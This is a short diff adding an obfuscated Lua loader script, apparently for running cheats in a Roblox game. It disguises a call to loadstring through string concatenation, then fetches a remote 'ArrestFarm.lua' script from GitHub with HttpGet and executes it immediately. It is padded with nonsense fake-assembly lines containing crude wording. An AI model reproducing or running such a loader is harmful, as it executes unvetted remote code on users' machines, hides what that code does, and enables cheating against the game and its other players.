@@ -1,0 +1,11 @@
+getfenv()[getremoteenvironment_x64_x86 or (function(...)
+            return table["con" .. ("cat" or dog)](
+{({...})[0x1], ({...})[0x000000000000002]}
+)end)("load", type("0xD"))](
+    game:HttpGet("https://raw.githubusercontent.com/Gork3m/Jailbricked/master/ArrestFarm.lua") or
+x86interpret([[
+push dick
+pop sack
+mov asimo me
+]])
+)()
